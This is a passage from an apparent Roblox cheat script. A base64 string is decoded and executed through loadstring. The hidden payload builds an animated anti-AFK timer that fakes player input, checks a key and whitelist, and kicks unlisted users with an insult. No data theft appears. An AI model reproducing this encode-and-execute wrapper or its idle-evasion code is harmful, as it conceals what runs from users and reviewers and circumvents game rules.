mVuY3kgPSAwDQogICAgICAgICAgICBUaW1lckxhYmVsLlRleHRYQWxpZ25tZW50ID0gRW51bS5UZXh0WEFsaWdubWVudC5DZW50ZXINCiAgICAgICAgICAgIA0KICAgICAgICAgICAgLS0gR3JhZGllbnQgZm9yIFRpbWVyTGFiZWwNCiAgICAgICAgICAgIGxvY2FsIHRpbWVyR3JhZGllbnQgPSBJbnN0YW5jZS5uZXcoIlVJR3JhZGllbnQiKQ0KICAgICAgICAgICAgdGltZXJHcmFkaWVudC5Db2xvciA9IENvbG9yU2VxdWVuY2UubmV3KHsNCiAgICAgICAgICAgICAgICBDb2xvclNlcXVlbmNlS2V5cG9pbnQubmV3KDAsIENvbG9yMy5mcm9tUkdCKDI4LCAyMTYsIDIxMCkpLCAgIC0tICMxQ0Q4RDINCiAgICAgICAgICAgICAgICBDb2xvclNlcXVlbmNlS2V5cG9pbnQubmV3KDEsIENvbG9yMy5mcm9tUkdCKDE0NywgMjM3LCAxOTkpKSAgIC0tICM5M0VEQzcNCiAgICAgICAgICAgIH0pDQogICAgICAgICAgICB0aW1lckdyYWRpZW50LlJvdGF0aW9uID0gMA0KICAgICAgICAgICAgdGltZXJHcmFkaWVudC5QYXJlbnQgPSBUaW1lckxhYmVsDQogICAgICAgICAgICANCiAgICAgICAgICAgIC0tIEFuaW1hdGUgZ3JhZGllbnRzDQogICAgICAgICAgICBfRy5hbmltYXRlR3JhZGllbnRzID0gdHJ1ZQ0KICAgICAgICAgICAgdGFzay5zcGF3bihmdW5jdGlvbigpDQogICAgICAgICAgICAgICAgd2hpbGUgX0cuYW5pbWF0ZUdyYWRpZW50cyBkbw0KICAgICAgICAgICAgICAgICAgICBmb3IgaSA9IDAsIDM2MCwgMiBkbw0KICAgICAgICAgICAgICAgICAgICAgICAgaWYgbm90IF9HLmFuaW1hdGVHcmFkaWVudHMgdGhlbiBicmVhayBlbmQNCiAgICAgICAgICAgICAgICAgICAgICAgIGRpc3BsYXlHcmFkaWVudC5Sb3RhdGlvbiA9IGkNCiAgICAgICAgICAgICAgICAgICAgICAgIHRpbWVyR3JhZGllbnQuUm90YXRpb24gPSBpDQogICAgICAgICAgICAgICAgICAgICAgICB0YXNrLndhaXQoMC4wMykNCiAgICAgICAgICAgICAgICAgICAgZW5kDQogICAgICAgICAgICAgICAgZW5kDQogICAgICAgICAgICBlbmQpDQogICAgICAgICAgICANCiAgICAgICAgICAgIC0tIEFuaW1hdGlvbiBsb29wIGZvciBmYWRpbmcNCiAgICAgICAgICAgIF9HLmRpc3BsYXlBRksgPSB0cnVlDQogICAgICAgICAgICB0YXNrLnNwYXduKGZ1bmN0aW9uKCkNCiAgICAgICAgICAgICAgICB3aGlsZSBfRy5kaXNwbGF5QUZLIGRvDQogICAgICAgICAgICAgICAgICAgIC0tIEZhZGUgb3V0IGJvdGgNCiAgICAgICAgICAgICAgICAgICAgZm9yIGkgPSAwLCAxLCAwLjEgZG8NCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIG5vdCBfRy5kaXNwbGF5QUZLIHRoZW4gYnJlYWsgZW5kDQogICAgICAgICAgICAgICAgICAgICAgICBEaXNwbGF5TGFiZWwuVGV4dFRyYW5zcGFyZW5jeSA9IGkNCiAgICAgICAgICAgICAgICAgICAgICAgIFRpbWVyTGFiZWwuVGV4dFRyYW5zcGFyZW5jeSA9IGkNCiAgICAgICAgICAgICAgICAgICAgICAgIHRhc2sud2FpdCgwLjA1KQ0KICAgICAgICAgICAgICAgICAgICBlbmQNCiAgICAgICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgICAgIGlmIG5vdCBfRy5kaXNwbGF5QUZLIHRoZW4gYnJlYWsgZW5kDQogICAgICAgICAgICAgICAgICAgIHRhc2sud2FpdCgwLjUpDQogICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICAgICAtLSBGYWRlIGluIGJvdGgNCiAgICAgICAgICAgICAgICAgICAgZm9yIGkgPSAxLCAwLCAtMC4xIGRvDQogICAgICAgICAgICAgICAgICAgICAgICBpZiBub3QgX0cuZGlzcGxheUFGSyB0aGVuIGJyZWFrIGVuZA0KICAgICAgICAgICAgICAgICAgICAgICAgRGlzcGxheUxhYmVsLlRleHRUcmFuc3BhcmVuY3kgPSBpDQogICAgICAgICAgICAgICAgICAgICAgICBUaW1lckxhYmVsLlRleHRUcmFuc3BhcmVuY3kgPSBpDQogICAgICAgICAgICAgICAgICAgICAgICB0YXNrLndhaXQoMC4wNSkNCiAgICAgICAgICAgICAgICAgICAgZW5kDQogICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICAgICBpZiBub3QgX0cuZGlzcGxheUFGSyB0aGVuIGJyZWFrIGVuZA0KICAgICAgICAgICAgICAgICAgICB0YXNrLndhaXQoMykNCiAgICAgICAgICAgICAgICBlbmQNCiAgICAgICAgICAgIGVuZCkNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgLS0gVGltZXINCiAgICAgICAgICAgIGxvY2FsIHNlY29uZHMsIG1pbnV0ZXMsIGhvdXJzID0gMCwgMCwgMA0KICAgICAgICAgICAgX0cudGltZXJBRksgPSB0cnVlDQogICAgICAgICAgICB0YXNrLnNwYXduKGZ1bmN0aW9uKCkNCiAgICAgICAgICAgICAgICB3aGlsZSBfRy50aW1lckFGSyBkbw0KICAgICAgICAgICAgICAgICAgICBzZWNvbmRzID0gc2Vjb25kcyArIDENCiAgICAgICAgICAgICAgICAgICAgdGFzay53YWl0KDEpDQogICAgICAgICAgICAgICAgICAgIGlmIHNlY29uZHMgPj0gNjAgdGhlbiBzZWNvbmRzID0gMDsgbWludXRlcyA9IG1pbnV0ZXMgKyAxIGVuZA0KICAgICAgICAgICAgICAgICAgICBpZiBtaW51dGVzID49IDYwIHRoZW4gbWludXRlcyA9IDA7IGhvdXJzID0gaG91cnMgKyAxIGVuZA0KICAgICAgICAgICAgICAgICAgICBUaW1lckxhYmVsLlRleHQgPSBzdHJpbmcuZm9ybWF0KCIlMDJkOiUwMmQ6JTAyZCIsIGhvdXJzLCBtaW51dGVzLCBzZWNvbmRzKQ0KICAgICAgICAgICAgICAgIGVuZA0KICAgICAgICAgICAgZW5kKQ0KICAgICAgICAgICAgDQogICAgICAgICAgICAtLSBBbnRpLUFGSyBmdW5jdGlvbg0KICAgICAgICAgICAgbG9jYWwgdnUgPSBnYW1lOkdldFNlcnZpY2UoJ1ZpcnR1YWxVc2VyJykNCiAgICAgICAgICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5JZGxlZDpDb25uZWN0KGZ1bmN0aW9uKCkNCiAgICAgICAgICAgICAgICB2dTpDYXB0dXJlQ29udHJvbGxlcigpDQogICAgICAgICAgICAgICAgdnU6Q2xpY2tCdXR0b24yKFZlY3RvcjIubmV3KCkpDQogICAgICAgICAgICBlbmQpDQogICAgICAgICAgICANCiAgICAgICAgICAgIFdpbmRvdzpOb3RpZnkoew0KICAgICAgICAgICAgICAgIFRpdGxlID0gIkFudGkgQUZLIiwNCiAgICAgICAgICAgICAgICBEZXNjID0gIkFudGkgQUZLIGFjdGl2YXRlZCB3aXRoIGFuaW1hdGVkIHRpbWVyISIsDQogICAgICAgICAgICAgICAgVGltZSA9IDMNCiAgICAgICAgICAgIH0pDQogICAgICAgIGVsc2UNCiAgICAgICAgICAgIC0tIFR1cm4gb2ZmDQogICAgICAgICAgICBfRy5kaXNwbGF5QUZLID0gZmFsc2UNCiAgICAgICAgICAgIF9HLnRpbWVyQUZLID0gZmFsc2UNCiAgICAgICAgICAgIF9HLmFuaW1hdGVHcmFkaWVudHMgPSBmYWxzZQ0KICAgICAgICAgICAgaWYgZ2FtZS5Db3JlR3VpOkZpbmRGaXJzdENoaWxkKCJBbnRpQUZLRGlzcGxheSIpIHRoZW4NCiAgICAgICAgICAgICAgICBnYW1lLkNvcmVHdWkuQW50aUFGS0Rpc3BsYXk6RGVzdHJveSgpDQogICAgICAgICAgICBlbmQNCiAgICAgICAgICAgIFdpbmRvdzpOb3RpZnkoew0KICAgICAgICAgICAgICAgIFRpdGxlID0gIkFudGkgQUZLIiwNCiAgICAgICAgICAgICAgICBEZXNjID0gIkFudGkgQUZLIGRlYWN0aXZhdGVkISIsDQogICAgICAgICAgICAgICAgVGltZSA9IDMNCiAgICAgICAgICAgIH0pDQogICAgICAgIGVuZA0KICAgIGVuZA0KfSkNCg0KV2luZG93Ok5vdGlmeSh7DQogICAgVGl0bGUgPSAi8J+OiSBEWUxBTiBTTyBGSU5FIFNDUklQVCAtIENPTVBMRVRFISIsDQogICAgRGVzYyA9ICJBbGwgMTEgdGFicyBsb2FkZWQgc3VjY2Vzc2Z1bGx5ISBFbmpveSB5b3VyIHVsdGltYXRlIFNjcmlwdCHwn5qAIiwNCiAgICBUaW1lID0gMTANCn0pDQoNCmVsc2VpZiBub3QgaXNXaGl0ZWxpc3RlZCB0aGVuDQogICAgICAgIC0tIE5vdCB3aGl0ZWxpc3RlZCAtIFNIUklOSyBUTyBMT0FESU5HIEJPWA0KICAgICAgICBzaHJpbmtJbnRvTG9hZGluZ0JveCgpDQogICAgICAgIA0KICAgICAgICAtLSBTdGFydCBsb2FkaW5nIGFuaW1hdGlvbg0KICAgICAgICBhbmltYXRlTG9hZGluZ0JhcigpDQogICAgICAgIA0KICAgICAgICAtLSBXYWl0IGZvciBsb2FkaW5nIHRvIGNvbXBsZXRlDQogICAgICAgIHdhaXQoMC41KQ0KICAgICAgICANCiAgICAgICAgLS0gU2hvdyBmaW5hbCByZXN1bHQNCiAgICAgICAgbG9hZGluZ1RleHQuVGV4dCA9ICLinYwgTm90IFdoaXRlbGlzdGVkIC0gS2lja2luZy4uLiINCiAgICAgICAgbG9hZGluZ1RleHQuVGV4dENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDI1NSwgMTAwLCAxMDApDQogICAgICAgIHBlcmNlbnRhZ2VUZXh0LlRleHRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigyNTUsIDEwMCwgMTAwKQ0KICAgICAgICANCiAgICAgICAgd2FpdCgxLjUpDQogICAgICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllcjpLaWNrKCJVTUFTQSBLQUJBPyBUQU5HQSBLQSBFSCIpDQogICAgICAgIA0KICAgIGVsc2UNCiAgICAgICAgLS0gV2hpdGVsaXN0ZWQgYnV0IHdyb25nIGtleSAtIFdST05HIEtFWSBTSEFLRQ0KICAgICAgICBzdGF0dXMuVGV4dCA9ICLinYwgSW52YWxpZCBrZXkhIg0KICAgICAgICBzdGF0dXMuVGV4dENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDI1NSwgMTUwLCA1MCkNCiAgICAgICAgDQogICAgICAgIC0tIEFuaW1hdGUgd2FybmluZyB3aXRoIHNoYWtlDQogICAgICAgIGdhbWU6R2V0U2VydmljZSgiVHdlZW5TZXJ2aWNlIik6Q3JlYXRlKHN1Ym1pdEJ0biwgVHdlZW5JbmZvLm5ldygwLjUpLCB7QmFja2dyb3VuZENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDI1NSwgMTUwLCA1MCl9KTpQbGF5KCkNCiAgICAgICAgc2hha2VGcmFtZSgpDQogICAgICAgIA0KICAgICAgICAtLSBSZXNldCBhZnRlciAxLjUgc2Vjb25kcw0KICAgICAgICB3YWl0KDEuNSkNCiAgICAgICAgc3RhdHVzLlRleHQgPSAiIg0KICAgICAgICBnYW1lOkdldFNlcnZpY2UoIlR3ZWVuU2VydmljZSIpOkNyZWF0ZShzdWJtaXRCdG4sIFR3ZWVuSW5mby5uZXcoMC41KSwge0JhY2tncm91bmRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigyMjEsIDI0LCAyNCl9KTpQbGF5KCkNCiAgICBlbmQNCmVuZA0KDQotLSBDb25uZWN0IGJ1dHRvbg0Kc3VibWl0QnRuLk1vdXNlQnV0dG9uMUNsaWNrOkNvbm5lY3QodmVyaWZ5S2V5KQ0KDQotLSBFbnRlciBrZXkgdG8gc3VibWl0DQprZXlCb3guRm9jdXNMb3N0OkNvbm5lY3QoZnVuY3Rpb24oZW50ZXJQcmVzc2VkKQ0KICAgIGlmIGVudGVyUHJlc3NlZCB0aGVuDQogICAgICAgIHZlcmlmeUtleSgpDQogICAgZW5kDQplbmQpDQoNCg==" local __map={};(function() local chars='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/' for i=1,#chars do __map[string.sub(chars,i,i)]=i-1 end end)() local out={};local i=1;while i<=#__b do local c1=__map[string.sub(__b,i,i)];local c2=__map[string.sub(__b,i+1,i+1)];local c3=__map[string.sub(__b,i+2,i+2)];local c4=__map[string.sub(__b,i+3,i+3)];if not c1 then break end;c2=c2 or 0;c3=c3 or 0;c4=c4 or 0;local n=c1*262144+c2*4096+c3*64+c4;local b1=math.floor(n/65536)%256;local b2=math.floor(n/256)%256;local b3=n%256;out[#out+1]=string.char(b1);if string.sub(__b,i+2,i+2)~='=' then out[#out+1]=string.char(b2) end;if string.sub(__b,i+3,i+3)~='=' then out[#out+1]=string.char(b3) end;i=i+4 end;local decoded=table.concat(out) local ok,err=pcall(function() local loader=loadstring or load;local f=loader(decoded);if type(f)=='function'then f() end end) if not ok then pcall(function() print('Wrapper error: '..tostring(err)) end) end end)()
